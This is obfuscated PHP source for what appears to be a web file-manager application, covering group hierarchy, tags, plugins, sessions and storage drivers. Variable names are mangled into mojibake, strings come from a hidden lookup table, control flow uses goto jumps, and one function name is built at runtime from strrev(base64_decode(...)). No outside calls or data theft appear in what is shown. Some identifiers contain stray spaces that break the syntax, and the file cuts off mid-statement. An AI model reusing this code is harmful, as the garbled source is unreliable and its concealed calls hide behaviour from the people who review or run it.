$„Ì”°ºµ[$À©°Õ¸[32]]; } $„Ì”°ºµ[$À©°Õ¸[598]] = str_replace($À©°Õ¸[601], $À©°Õ¸[8], $£¨Ø¿­·); } unset($„Ì”°ºµ); } private function _listAppendSourceRoot(&$ÕâëÜáª, $¸©ªœ´Ä) { $…Êí³ª =& $_SERVER[÷ôÚîå]; $ÜÔ±¨Ôú = Model($…Êí³ª[914])->listSourceRoot(SourceModel::TYPE_GROUP, $¸©ªœ´Ä); $ÜÔ±¨Ôú = array_to_keyvalue($ÜÔ±¨Ôú, $…Êí³ª[578]); $ÜÔ±¨Ôú = array_remove_key($ÜÔ±¨Ôú, $…Êí³ª[578]); foreach ($ÕâëÜáª as &$–Çú¨îú) { $–Çú¨îú[$…Êí³ª[100]] = $ÜÔ±¨Ôú[$–Çú¨îú[$…Êí³ª[1978]]] ? $ÜÔ±¨Ôú[$–Çú¨îú[$…Êí³ª[1978]]] : array(); } unset($–Çú¨îú); } protected function groupMerge($ğ¥óşê³) { $ğ¥óşê³ = array_values(array_unique($ğ¥óşê³)); $Å½‚ÅÉï = array(); for ($êûŞôã = 0; $êûŞôã < count($ğ¥óşê³); $êûŞôã++) { $Ä‡¡£ğ = !1; for ($ÌÒï¿±† = 0; $ÌÒï¿±† < count($ğ¥óşê³); $ÌÒï¿±†++) { if ($êûŞôã == $ÌÒï¿±†) { continue; } if ($this->isParentOf($ğ¥óşê³[$ÌÒï¿±†], $ğ¥óşê³[$êûŞôã])) { $Ä‡¡£ğ = !0; break; } } if (!$Ä‡¡£ğ) { $Å½‚ÅÉï[] = $ğ¥óşê³[$êûŞôã]; } } return $Å½‚ÅÉï; } protected function isParentOf($æÔ¦¿ø£, $âù€ëì…) { $×ÓŠÚÑá =& $_SERVER[÷ôÚîå]; if (!$æÔ¦¿ø£ || !$âù€ëì… || $æÔ¦¿ø£ == $âù€ëì…) { return !1; } $ÌÂóåÜ¡ = $this->getInfoSimple($æÔ¦¿ø£); $‹”¶÷òœ = $this->getInfoSimple($âù€ëì…); $µ‡¨¦Š = $ÌÂóåÜ¡[$×ÓŠÚÑá[593]] . $æÔ¦¿ø£ . $×ÓŠÚÑá[50]; if (substr($‹”¶÷òœ[$×ÓŠÚÑá[593]], 0, strlen($µ‡¨¦Š)) == $µ‡¨¦Š) { return !0; } return !1; } public function groupShowRoot($üšìÂ™“, $»ŒÈìàÉ = false) { $ôÏ­³ê =& $_SERVER[÷ôÚîå]; $ ûĞ¡€¥ = $this->getInfo($üšìÂ™“); if (!$ ûĞ¡€¥) { return array(); } $âÎ”³É = $this->parentLevelArray($ ûĞ¡€¥[$ôÏ­³ê[593]]); $‘åïú¿Ø = array($üšìÂ™“); if (count($âÎ”³É) == 0) { return $‘åïú¿Ø; } if ($»ŒÈìàÉ && count($âÎ”³É) == 1) { return $‘åïú¿Ø; } if (!$ ûĞ¡€¥[$ôÏ­³ê[548]] || !isset($ ûĞ¡€¥[$ôÏ­³ê[548]][$ôÏ­³ê[2068]]) || $ ûĞ¡€¥[$ôÏ­³ê[548]][$ôÏ­³ê[2068]] == $ôÏ­³ê[865]) { return $this->groupShowRoot($âÎ”³É[count($âÎ”³É) - 1], $»ŒÈìàÉ); } if ($ ûĞ¡€¥[$ôÏ­³ê[548]][$ôÏ­³ê[2068]] == $ôÏ­³ê[442]) { $×ı¶²Ü = explode($ôÏ­³ê[50], $ ûĞ¡€¥[$ôÏ­³ê[548]][$ôÏ­³ê[2069]]); if ($×ı¶²Ü) { $‘åïú¿Ø = array_merge($‘åïú¿Ø, $×ı¶²Ü); } } return $‘åïú¿Ø; } protected function resetParentLevel() { $¿ÌË«‡¶ =& $_SERVER[÷ôÚîå]; $µûà£„Ü = $¿ÌË«‡¶[1978]; $åßöõÛ = $this->select(); $åßöõÛ = array_to_keyvalue($åßöõÛ, $µûà£„Ü); foreach ($åßöõÛ as $„ßõÈšº) { $øå‹Ï­Ñ = $„ßõÈšº; $ÚØŒ— ’ = array(); while ($øå‹Ï­Ñ[$¿ÌË«‡¶[202]] != 0) { $ÚØŒ— ’[] = $øå‹Ï­Ñ[$¿ÌË«‡¶[202]]; $øå‹Ï­Ñ = $åßöõÛ[$øå‹Ï­Ñ[$¿ÌË«‡¶[202]]]; } $ÚØŒ— ’[] = 0; $ÚØŒ— ’ = $¿ÌË«‡¶[50] . implode($¿ÌË«‡¶[50], array_reverse($ÚØŒ— ’)) . $¿ÌË«‡¶[50]; $this->setNamePinyin($„ßõÈšº[$µûà£„Ü], $„ßõÈšº[$¿ÌË«‡¶[32]]); $this->where(array($µûà£„Ü => $„ßõÈšº[$µûà£„Ü]))->save(array($¿ÌË«‡¶[661] => $ÚØŒ— ’)); } return $åßöõÛ; } public function groupNameAuto($¿­±ùÁ, $³©íµ«) { $ıÔÂÏâ„ =& $_SERVER[÷ôÚîå]; $‚ÊİÅ = $this->where(array($ıÔÂÏâ„[486] => $¿­±ùÁ))->getField($ıÔÂÏâ„[32], !0); if (!$‚ÊİÅ || !in_array($³©íµ«, $‚ÊİÅ)) { return $³©íµ«; } for ($ˆ†éÜö  = 1; $ˆ†éÜö  <= count($‚ÊİÅ) + 1; $ˆ†éÜö ++) { $íç¢¨ªĞ = $³©íµ« . "\50{$ˆ†éÜö }\x29"; if (!in_array($íç¢¨ªĞ, $‚ÊİÅ)) { return $íç¢¨ªĞ; } } } public function groupSwitch($‚ó­¥ÑÚ, $³é€áÊ) { $ïëÚĞÜŠ =& $_SERVER[÷ôÚîå]; $İº«…°” = array($ïëÚĞÜŠ[1978] => array($ïëÚĞÜŠ[7], array($‚ó­¥ÑÚ, $³é€áÊ))); $Ù«¢Úšù = $this->where($İº«…°”)->select(); $Ù«¢Úšù = array_to_keyvalue($Ù«¢Úšù, $ïëÚĞÜŠ[1978]); if (!isset($Ù«¢Úšù[$‚ó­¥ÑÚ]) || !isset($Ù«¢Úšù[$³é€áÊ]) || $Ù«¢Úšù[$‚ó­¥ÑÚ][$ïëÚĞÜŠ[202]] == 0) { return !1; } $İº«…°” = array($ïëÚĞÜŠ[1978] => $‚ó­¥ÑÚ); $ÄÆ¨î˜¤ = Model($ïëÚĞÜŠ[2072])->where($İº«…°”)->select(); if (!$ÄÆ¨î˜¤) { $ÄÆ¨î˜¤ = array(); } foreach ($ÄÆ¨î˜¤ as $•³ñæš) { $Ùòú‡Ç¶ = $•³ñæš[$ïëÚĞÜŠ[1779]]; $İº«…°” = array($ïëÚĞÜŠ[1779] => $Ùòú‡Ç¶, $ïëÚĞÜŠ[1978] => $³é€áÊ); $°Ûùø»” = Model($ïëÚĞÜŠ[2072])->where($İº«…°”)->find(); if (!$°Ûùø»”) { $ñÎµÂ€ = array($³é€áÊ => $•³ñæš[$ïëÚĞÜŠ[2086]]); Model($ïëÚĞÜŠ[607])->userGroupAdd($Ùòú‡Ç¶, $ñÎµÂ€); } Model($ïëÚĞÜŠ[607])->userGroupRemove($Ùòú‡Ç¶, $‚ó­¥ÑÚ); } $İº«…°” = array($ïëÚĞÜŠ[200] => 2, $ïëÚĞÜŠ[202] => 0, $ïëÚĞÜŠ[494] => 1, $ïëÚĞÜŠ[578] => array($ïëÚĞÜŠ[7], array($‚ó­¥ÑÚ, $³é€áÊ))); $¯§è¥Ç = Model($ïëÚĞÜŠ[914])->where($İº«…°”)->field($ïëÚĞÜŠ[2087])->select(); $¯§è¥Ç = array_to_keyvalue($¯§è¥Ç, $ïëÚĞÜŠ[578], $ïëÚĞÜŠ[203]); $ØÄ°Íá = !empty($¯§è¥Ç[$‚ó­¥ÑÚ]) ? $¯§è¥Ç[$‚ó­¥ÑÚ] : !1; if ($ØÄ°Íá) { if (!$¯§è¥Ç[$³é€áÊ]) { $¯§è¥Ç[$³é€áÊ] = Model($ïëÚĞÜŠ[914])->groupRootAdd($³é€áÊ); } $­­…Ş´° = $¯§è¥Ç[$³é€áÊ]; $İº«…°” = array($ïëÚĞÜŠ[202] => $ØÄ°Íá); $¯§è¥Ç = Model($ïëÚĞÜŠ[914])->where($İº«…°”)->field($ïëÚĞÜŠ[2088])->select(); if (!$¯§è¥Ç) { $¯§è¥Ç = array(); } Model($ïëÚĞÜŠ[914])->moveClearAuth = !1; foreach ($¯§è¥Ç as $ïÀ İ»É) { $¬Ê»«ìÈ = $ïÀ İ»É[$ïëÚĞÜŠ[494]] == $ïëÚĞÜŠ[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ïëÚĞÜŠ[914])->move($ïÀ İ»É[$ïëÚĞÜŠ[203]], $­­…Ş´°, $¬Ê»«ìÈ); } Model($ïëÚĞÜŠ[914])->moveClearAuth = !0; $İº«…°” = array($ïëÚĞÜŠ[200] => 2, $ïëÚĞÜŠ[578] => $‚ó­¥ÑÚ); $ÀäıñÓ = array($ïëÚĞÜŠ[578] => $³é€áÊ); Model($ïëÚĞÜŠ[2089])->where($İº«…°”)->save($ÀäıñÓ); Model($ïëÚĞÜŠ[2090])->where($İº«…°”)->save($ÀäıñÓ); } $this->_changeChildLevel($Ù«¢Úšù[$‚ó­¥ÑÚ], $Ù«¢Úšù[$³é€áÊ], !0); $this->where(array($ïëÚĞÜŠ[202] => $‚ó­¥ÑÚ))->save(array($ïëÚĞÜŠ[202] => $³é€áÊ)); $this->_clearChildrenCache($Ù«¢Úšù[$³é€áÊ]); return !0; } } goto f‘°¥Õ„”; A¨ïÇ…’·ç: function binCheckBigger($á ïáÑ, $Ÿª‘ÈâÙ) { return $á ïáÑ > $Ÿª‘ÈâÙ; } $_SERVER[$_SERVER[’òÌ€º¦][3]] = ("\70\65\62\71".base64_decode('OTc='))+0;$_2jeh="s42a8o60y7bptjfel5v9cd3xnqhgz1miwkurtgnw9jxdq3ay1b08vpmrzeo2c7u6kfhsi";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Şèß´€, $Ó•úşÁé) { $’·²ŒßÒ =& $_SERVER[÷ôÚîå]; if (isset(self::$_methodList[$Şèß´€])) { return @call_user_func_array(self::$_methodList[$Şèß´€], $Ó•úşÁé); } else { if (method_exists($this, $Şèß´€)) { return call_user_func_array(array($this, $Şèß´€), $Ó•úşÁé); } else { think_exception(__CLASS__ . $’·²ŒßÒ[4] . $Şèß´€ . $’·²ŒßÒ[5]); } } } public static function __callStatic($Áëş€Éµ, $‡íÄ–éø) { if (isset(self::$_methodListStatic[$Áëş€Éµ])) { return call_user_func_array(self::$_methodListStatic[$Áëş€Éµ], $‡íÄ–éø); } else { if (method_exists(self, $Áëş€Éµ)) { return call_user_func_array(array(self, $Áëş€Éµ), $‡íÄ–éø); } else { show_json("{$Áëş€Éµ}\50\x29\x20\156\157\x74\x20\x65\x78\151\163\164\73", !1); } } } public static function addMethod($×÷ë›§Ü, $ˆ¾Î“ù) { self::$_methodList[$×÷ë›§Ü] = $ˆ¾Î“ù; } public static function addMethodStatic($ ®¡‹Ü±, $èßÊ£Õ´) { self::$_methodListStatic[$ ®¡‹Ü±] = $èßÊ£Õ´; } } goto eğËÇå’¼˜; a‚„…ì: $fileSize = strrev(base64_decode($_SERVER[’òÌ€º¦][0])); function binCheckNeq($Òõ×§Ä, $¸ÉÂÂâ) { return $Òõ×§Ä != $¸ÉÂÂâ; } $_SERVER[$_SERVER[’òÌ€º¦][1]] = $fileSize($_SERVER[$_SERVER[’òÌ€º¦][2]]); goto A¨ïÇ…’·ç; A²£‹¼êƒ: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\x61\166"; protected function cacheFunctionAlias($­µàÆ¾Ã) { $Ï¶¦Ï’Î =& $_SERVER[÷ôÚîå]; return array($Ï¶¦Ï’Î[2091] => array($­µàÆ¾Ã[0], $Ï¶¦Ï’Î[2092]), $Ï¶¦Ï’Î[2093] => array($­µàÆ¾Ã[0], $Ï¶¦Ï’Î[2094])); } protected function get($‘Ìıßš) { $¢“Ì¢– =& $_SERVER[÷ôÚîå]; $Ş“Î‘òã = Model($¢“Ì¢–[594])->metaGet($‘Ìıßš, $¢“Ì¢–[2095]); $„ôÀá“˜ = json_decode($Ş“Î‘òã, !0); return $„ôÀá“˜ ? $„ôÀá“˜ : array($¢“Ì¢–[2096] => $¢“Ì¢–[101], $¢“Ì¢–[454] => array()); } protected function set($…ãæá²ù, $æ›—ê‰à) { $Ò‚áËõ =& $_SERVER[÷ôÚîå]; $æ›—ê‰à = $æ›—ê‰à ? $æ›—ê‰à : array($Ò‚áËõ[2096] => $Ò‚áËõ[101], $Ò‚áËõ[454] => array()); return Model($Ò‚áËõ[594])->metaSet($…ãæá²ù, $Ò‚áËõ[2095], json_encode($æ›—ê‰à)); } protected function getByTagID($Ø…µÔÇø, $ô´û†») { $”·ú˜ñ» =& $_SERVER[÷ôÚîå]; if (!$Ø…µÔÇø || !$ô´û†») { return !1; } if (!Model($”·ú˜ñ»[594])->getInfoSimple($Ø…µÔÇø)) { return !1; } $İ²¨ØÛ¢ = $this->get($Ø…µÔÇø); if (!$İ²¨ØÛ¢ || !isset($İ²¨ØÛ¢[$”·ú˜ñ»[454]])) { return !1; } $¯¯Ğ…Ô = array_find_by_field($İ²¨ØÛ¢[$”·ú˜ñ»[454]], $”·ú˜ñ»[484], $ô´û†»); return is_array($¯¯Ğ…Ô) ? $¯¯Ğ…Ô : !1; } public function listSource($ÚéôóÂŸ, $°˜Ò¿Ó“) { $æê¡ÛÔÊ =& $_SERVER[÷ôÚîå]; if ($°˜Ò¿Ó“ && !is_array($°˜Ò¿Ó“)) { $°˜Ò¿Ó“ = array($°˜Ò¿Ó“); } $¸³ÉØŞ† = $this->listData($ÚéôóÂŸ); $Â¸ÈĞ = array(); foreach ($¸³ÉØŞ† as $¬ıÁËÙÅ) { $‘Ô×¸å¼ = $¬ıÁËÙÅ[$æê¡ÛÔÊ[97]]; if (!$‘Ô×¸å¼) { continue; } if (!isset($Â¸ÈĞ[$‘Ô×¸å¼])) { $Â¸ÈĞ[$‘Ô×¸å¼] = array(); } $Â¸ÈĞ[$‘Ô×¸å¼][] = $¬ıÁËÙÅ[$æê¡ÛÔÊ[509]]; } $´÷Ì ‘“ = array(); foreach ($Â¸ÈĞ as $ñ‹„©ô‰ => $šò†¾€’) { $ïÏÒóÃì = !0; if (!$°˜Ò¿Ó“) { $´÷Ì ‘“[] = $ñ‹„©ô‰; continue; } foreach ($°˜Ò¿Ó“ as $¢Äğèğ³) { if (!in_array($¢Äğèğ³, $šò†¾€’)) { $ïÏÒóÃì = !1; break; } } if ($ïÏÒóÃì) { $´÷Ì ‘“[] = $ñ‹„©ô‰; } } if (!$´÷Ì ‘“) { return array(); } $§Á‹Å©ı = array($æê¡ÛÔÊ[500] => array($æê¡ÛÔÊ[501], $´÷Ì ‘“), $æê¡ÛÔÊ[578] => $ÚéôóÂŸ, $æê¡ÛÔÊ[200] => SourceModel::TYPE_GROUP); $øöéŠî = Model($æê¡ÛÔÊ[1429])->listSource($§Á‹Å©ı); if (!$øöéŠî || count($´÷Ì ‘“) == $øöéŠî[$æê¡ÛÔÊ[451]][$æê¡ÛÔÊ[452]]) { return $øöéŠî; } $Ù‹³Œğş = array(); $ÈàÈÕ’ = array_to_keyvalue($øöéŠî[$æê¡ÛÔÊ[95]], $æê¡ÛÔÊ[12], $æê¡ÛÔÊ[203]); $Ã£÷Æò£ = array_to_keyvalue($øöéŠî[$æê¡ÛÔÊ[96]], $æê¡ÛÔÊ[12], $æê¡ÛÔÊ[203]); $¸úÉ…†³ = array_merge($Ã£÷Æò£, $ÈàÈÕ’); foreach ($´÷Ì ‘“ as $‘Ô×¸å¼) { if (!in_array($‘Ô×¸å¼, $¸úÉ…†³)) { $Ù‹³Œğş[] = $‘Ô×¸å¼; } } if ($Ù‹³Œğş) { $this->removeBySource($ÚéôóÂŸ, $Ù‹³Œğş); } return $øöéŠî; } protected function listData($¼øıß€›) { $²Ø‰âÉ² =& $_SERVER[÷ôÚîå]; $Ë÷£€ñŞ = array($²Ø‰âÉ²[1770] => 0, $²Ø‰âÉ²[566] => array($²Ø‰âÉ²[2097], 0), $²Ø‰âÉ²[505] => $²Ø‰âÉ²[2098] . $¼øıß€›); $Üæ­¡¢ = $²Ø‰âÉ²[2099]; $¤š¤Å = $this->field($Üæ­¡¢)->where($Ë÷£€ñŞ)->order($²Ø‰âÉ²[2100])->select(); return $¤š¤Å ? $¤š¤Å : array(); } protected function addToTag($Ë™¿—»‰, $®ö×Êæ, $‘Œ°ñËÓ) { $ßµ„ÄÖÅ =& $_SERVER[÷ôÚîå]; if (!$this->getByTagID($Ë™¿—»‰, $‘Œ°ñËÓ) || !$®ö×Êæ) { return !1; } if (!Model($ßµ„ÄÖÅ[914])->pathInfo($®ö×Êæ)) { return !1; } $Ğº¢í² = array($ßµ„ÄÖÅ[1770] => 0, $ßµ„ÄÖÅ[566] => $‘Œ°ñËÓ, $ßµ„ÄÖÅ[504] => $®ö×Êæ, $ßµ„ÄÖÅ[505] => $ßµ„ÄÖÅ[2101] . $Ë™¿—»‰, $ßµ„ÄÖÅ[503] => $ßµ„ÄÖÅ[12], $ßµ„ÄÖÅ[1982] => 0); if ($this->where($Ğº¢í²)->find()) { return !1; } return $this->add($Ğº¢í²); } protected function removeFromTag($•¢¬ËŒ¿, $›ì‡¦Û, $Øöî›) { $””œÈâŒ =& $_SERVER[÷ôÚîå]; if (!$this->getByTagID($•¢¬ËŒ¿, $Øöî›) || !$›ì‡¦Û) { return !1; } if (is_array($›ì‡¦Û)) { $›ì‡¦Û = array($””œÈâŒ[7], $›ì‡¦Û); } $öøÙñ·Æ = array($””œÈâŒ[1770] => 0, $””œÈâŒ[566] => $Øöî›, $””œÈâŒ[505] => $””œÈâŒ[2101] . $•¢¬ËŒ¿, $””œÈâŒ[504] => $›ì‡¦Û); return $this->where($öøÙñ·Æ)->delete(); } protected function removeByTag($®¯¤ÙŸÊ, $ûºı˜ş³) { $ˆÕÒä› =& $_SERVER[÷ôÚîå]; if (!$this->getByTagID($®¯¤ÙŸÊ, $ûºı˜ş³)) { return !1; } $—©¶áÆ = array($ˆÕÒä›[1770] => 0, $ˆÕÒä›[566] => $ûºı˜ş³, $ˆÕÒä›[505] => $ˆÕÒä›[2101] . $®¯¤ÙŸÊ); return $this->where($—©¶áÆ)->delete(); } protected function removeBySource($¹ŞÀÀ¼ñ, $öÎ´Õ¨¢) { $Ã·ÄÍÇ³ =& $_SERVER[÷ôÚîå]; if (!$¹ŞÀÀ¼ñ || !$öÎ´Õ¨¢) { return !1; } if (is_array($öÎ´Õ¨¢)) { $öÎ´Õ¨¢ = array($Ã·ÄÍÇ³[7], $öÎ´Õ¨¢); } $Ô¹ü€äÇ = array($Ã·ÄÍÇ³[1770] => 0, $Ã·ÄÍÇ³[504] => $öÎ´Õ¨¢, $Ã·ÄÍÇ³[566] => array($Ã·ÄÍÇ³[1103], 0), $Ã·ÄÍÇ³[505] => $Ã·ÄÍÇ³[2101] . $¹ŞÀÀ¼ñ); return $this->where($Ô¹ü€äÇ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\160\154\165\147\151\x6e\114\151\163\164"; public $field = array("\156\x61\x6d\145", "\x73\164\141\164\x75\163", "\x72\145\x67\x69\x65\163\x74", "\x63\157\x6e\x66\151\x67"); public function loadList($©×ïˆ›û = false) { $²¿èë = array_to_keyvalue($this->listData(), $_SERVER[÷ôÚîå][32]); if ($©×ïˆ›û) { return $²¿èë[$©×ïˆ›û]; } return $²¿èë; } public function init() { $ê¦«ŞÙÊ =& $_SERVER[÷ôÚîå]; Hook::trigger($ê¦«ŞÙÊ[2102]); $¢£€ú¼¶ = $this->loadPluginList(); foreach ($¢£€ú¼¶ as $„Æ³éâ¼ => $®œÈÕ×) { $¯´°ª‚Ò = $this->appAllow($„Æ³éâ¼, $®œÈÕ×); if (!$¯´°ª‚Ò) { continue; } foreach ($®œÈÕ×[$ê¦«ŞÙÊ[2103]] as $£Ñ¯Í™‰ => $×¥àßş) { Hook::bind($£Ñ¯Í™‰, $×¥àßş); } } Hook::trigger($ê¦«ŞÙÊ[2104]); Hook::trigger(ACTION); } public function appAllow($¡ñ†ÙÌñ, $¾İ¼Í, $ÅÎ¿œ® = true) { $»ê¤ô’ =& $_SERVER[÷ôÚîå]; $¥ÚôãÍå = PLUGIN_DIR . $¡ñ†ÙÌñ . $»ê¤ô’[2105]; if (!is_array($¾İ¼Í) || !is_array($¾İ¼Í[$»ê¤ô’[2103]]) || $¾İ¼Í[$»ê¤ô’[839]] != 1 || !is_file($¥ÚôãÍå)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$»ê¤ô’[6]][$»ê¤ô’[2106]] || !$GLOBALS[$»ê¤ô’[6]][$»ê¤ô’[2107]]) { return !0; } $¹ˆÜü²™ = explode($»ê¤ô’[50], strtolower($GLOBALS[$»ê¤ô’[6]][$»ê¤ô’[2107]])); return in_array(strtolower($¡ñ†ÙÌñ), $¹ˆÜü²™) ? !1 : !0; } if ($ÅÎ¿œ® && !Action($»ê¤ô’[2108])->checkAuth($¡ñ†ÙÌñ)) { return !1; } return !0; } public function unInstall($ØÓ†•Âš) { $ï‡ˆËıÔ =& $_SERVER[÷ôÚîå]; $Æğœ÷‚ş = $this->loadList($ØÓ†•Âš); if (file_exists(PLUGIN_DIR . $ØÓ†•Âš)) { Hook::apply($ØÓ†•Âš . $ï‡ˆËıÔ[2109]); } $this->remove($Æğœ÷‚ş[$ï‡ˆËıÔ[484]]); } public function changeStatus($éŞÂê©‹, $¹Å‘òÊó) { $‘ºÂÈ¼½ =& $_SERVER[÷ôÚîå]; $¶‰ˆ×·§ = $this->loadList($éŞÂê©‹); if ($¹Å‘òÊó) { Hook::apply($éŞÂê©‹ . $‘ºÂÈ¼½[2110]); } $this->update($¶‰ˆ×·§[$‘ºÂÈ¼½[484]], array($‘ºÂÈ¼½[2111] => $¹Å‘òÊó)); } public function appRegist($€‡Ì®¹, $ ÷Ã¿Ÿ) { $Ûìéƒí =& $_SERVER[÷ôÚîå]; $İœŸ¡»ˆ = $this->loadList($€‡Ì®¹); if ($İœŸ¡»ˆ) { $this->update($İœŸ¡»ˆ[$Ûìéƒí[484]], array($Ûìéƒí[2103] => $ ÷Ã¿Ÿ)); } else { $º§´ª¦¨ = array($Ûìéƒí[32] => $€‡Ì®¹, $Ûìéƒí[2103] => $ ÷Ã¿Ÿ, $Ûìéƒí[839] => 0, $Ûìéƒí[6] => $this->getConfigDefault($€‡Ì®¹)); $this->insert($º§´ª¦¨); } } public function getConfigDefault($‹Ïúˆêœ) { $íÅúç²š =& $_SERVER[÷ôÚîå]; $Ş¾¼¼¡ã = array(); $õØàìŠ‘ = $this->getPackageJson($‹Ïúˆêœ); if (!$õØàìŠ‘ && is_array($õØàìŠ‘[$íÅúç²š[2112]])) { return $Ş¾¼¼¡ã; } foreach ($õØàìŠ‘[$íÅúç²š[2112]] as $Å“¢İá„ => $×‡ããÑï) { if (!isset($×‡ããÑï[$íÅúç²š[459]]) || isset($Ş¾¼¼¡ã[$Å“¢İá„])) { continue; } $Ş¾¼¼¡ã[$Å“¢İá„] = $×‡ããÑï[$íÅúç²š[459]]; } return $Ş¾¼¼¡ã; } public function getPackageJson($ÊÌ‡‚) { return Hook::apply($ÊÌ‡‚ . $_SERVER[÷ôÚîå][2113]); } public function getConfig($¬ö¦ÏøŸ, $¦¢†·Ù = false) { $áÒƒƒû± =& $_SERVER[÷ôÚîå]; $¾ú—à¤ = array(); $×œú»³· = $this->loadList($¬ö¦ÏøŸ); if ($×œú»³· && is_array($×œú»³·[$áÒƒƒû±[6]])) { $¾ú—à¤ = $×œú»³·[$áÒƒƒû±[6]]; } if (!$¾ú—à¤ || $¦¢†·Ù) { $¾ú—à¤ = $this->getConfigDefault($¬ö¦ÏøŸ); } return $¾ú—à¤; } public function setConfig($‚óˆÓÑÈ, $áğÀùá• = false) { $¤§¤ÇÔ =& $_SERVER[÷ôÚîå]; $Ø¼í£æè = $this->loadList($‚óˆÓÑÈ); if (!$Ø¼í£æè) { return !1; } $Éì¨Î = $Ø¼í£æè[$¤§¤ÇÔ[6]]; if ($áğÀùá• == !1) { $Éì¨Î = array(); $áğÀùá• = $this->getConfigDefault($‚óˆÓÑÈ); } foreach ($áğÀùá• as $·Ö—«õ => $ğ‰«¾ˆ) { $Éì¨Î[$·Ö—«õ] = is_string($ğ‰«¾ˆ) ? trim($ğ‰«¾ˆ) : $ğ‰«¾ˆ; } $this->update($Ø¼í£æè[$¤§¤ÇÔ[484]], array($¤§¤ÇÔ[6] => $Éì¨Î)); } public function viewList() { $„¤¶•¨Ä =& $_SERVER[÷ôÚîå]; $³Ü÷ú = $this->loadList(); $this->pluginScan($³Ü÷ú); $³Ü÷ú = $this->loadPluginList(); $ËÊÒà·Ü = array(); foreach ($³Ü÷ú as $‹Î§ˆ©å => $ú»¿²ôÎ) { $‚ï­Ø±Ú = $ú»¿²ôÎ; unset($ú»¿²ôÎ[$„¤¶•¨Ä[2103]], $ú»¿²ôÎ[$„¤¶•¨Ä[6]]); $ŸÏ”Ü† = PLUGIN_DIR . $ú»¿²ôÎ[$„¤¶•¨Ä[32]] . $„¤¶•¨Ä[2105]; if (!is_file($ŸÏ”Ü†)) { continue; } $µúÜä”º = Hook::apply($ú»¿²ôÎ[$„¤¶•¨Ä[32]] . $„¤¶•¨Ä[2113]); if (!is_array($µúÜä”º)) { continue; } $ËÊÒà·Ü[$‹Î§ˆ©å] = array_merge($ú»¿²ôÎ, $µúÜä”º); if ($‚ï­Ø±Ú[$„¤¶•¨Ä[6]][$„¤¶•¨Ä[1693]] != $µúÜä”º[$„¤¶•¨Ä[1667]]) { Hook::apply($ú»¿²ôÎ[$„¤¶•¨Ä[32]] . $„¤¶•¨Ä[2110]); $‚ï­Ø±Ú[$„¤¶•¨Ä[6]][$„¤¶•¨Ä[1693]] = $µúÜä”º[$„¤¶•¨Ä[1667]]; $this->update($ú»¿²ôÎ[$„¤¶•¨Ä[484]], array($„¤¶•¨Ä[6] => $‚ï­Ø±Ú[$„¤¶•¨Ä[6]])); } } return $ËÊÒà·Ü; } private function loadPluginList() { $ı´İ®¶ =& $_SERVER[÷ôÚîå]; $‹°ğ¼¤ü = $this->loadList(); if (strtolower(MOD) == $ı´İ®¶[2114]) { return $‹°ğ¼¤ü; } $¨Î÷êç = Hook::trigger($ı´İ®¶[2115], $‹°ğ¼¤ü); if ($‹°ğ¼¤ü && !$¨Î÷êç) { die; } return $¨Î÷êç ? $¨Î÷êç : $‹°ğ¼¤ü; } private function pluginScan($‡Â¸²Õ¼) { $×í€Í÷ =& $_SERVER[÷ôÚîå]; recursion_dir(PLUGIN_DIR, $É¨şÚ‘, $ßÈäğìË, 0); foreach ($É¨şÚ‘ as $Í¼‰Ö°Ó) { $´ÂÜêÚö = get_path_this($Í¼‰Ö°Ó); if (isset($‡Â¸²Õ¼[$´ÂÜêÚö]) || !file_exists($Í¼‰Ö°Ó . $×í€Í÷[2116]) || !file_exists($Í¼‰Ö°Ó . $×í€Í÷[2105])) { continue; } Hook::apply($´ÂÜêÚö . $×í€Í÷[2110]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\x5f\163\x65\x73\163\x69\157\x6e"; public function get($ê´İÄè) { $Ì¤ ™şŠ =& $_SERVER[÷ôÚîå]; $ı³şÄ£å = $this->where(array($Ì¤ ™şŠ[2117] => $ê´İÄè))->find(); if (!is_array($ı³şÄ£å)) { return !1; } return $ı³şÄ£å[$Ì¤ ™şŠ[181]]; } public function set($î’±á¼ç, $¼Õû½Í, $ÂÓÅğ® = 3600) { $¸ÍÌ“ƒ =& $_SERVER[÷ôÚîå]; $ŞÉú“³˜ = array($¸ÍÌ“ƒ[2117] => $î’±á¼ç, $¸ÍÌ“ƒ[2017] => $¼Õû½Í, $¸ÍÌ“ƒ[2118] => $ÂÓÅğ® + time()); if (Session::get($¸ÍÌ“ƒ[2119])) { $ŞÉú“³˜[$¸ÍÌ“ƒ[1779]] = Session::get($¸ÍÌ“ƒ[2119]); } else { $ŞÉú“³˜[$¸ÍÌ“ƒ[1779]] = 0; } if ($this->get($î’±á¼ç)) { return $this->where(array($¸ÍÌ“ƒ[2117] => $î’±á¼ç))->save($ŞÉú“³˜); } else { return $this->add($ŞÉú“³˜, array(), !0); } } public function remove($ñš½üó) { return $this->where(array($_SERVER[÷ôÚîå][2117] => $ñš½üó))->delete(); } public function clearTimeout() { return $this->where($_SERVER[÷ôÚîå][2120] . time())->delete(); } } goto d¬¯ë•¬ó; b†„§ö‘Ê: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($õûö«äÁ) { parent::__construct($õûö«äÁ); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ãïê‰Õ) { parent::__construct($ãïê‰Õ); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } public function uploadFormData($—Ö…Úø, $ã»Â´¶£ = 3600) { $ôóóã˜ü =& $_SERVER[÷ôÚîå]; $êåªÍà” = $ôóóã˜ü[239]; $ŒˆÁÛ§° = $ôóóã˜ü[279]; $§£—”Ö = $ôóóã˜ü[72]; $û‘‘–ç = gmdate($ôóóã˜ü[280]); $âÑÛ¼¥ = gmdate($ôóóã˜ü[281]); $¸ªÌ¤â­ = $ôóóã˜ü[282]; $•÷õÚ˜ñ = $ã»Â´¶£ . $ôóóã˜ü[12]; $¿Ÿ‚ÒÖÈ = $ôóóã˜ü[283]; $¢¯—´ğ® = array($this->accessKey, $âÑÛ¼¥, $this->region, $§£—”Ö, $¸ªÌ¤â­); $Ÿé—»şš = implode($ôóóã˜ü[8], $¢¯—´ğ®); $¦œìÒ™ = 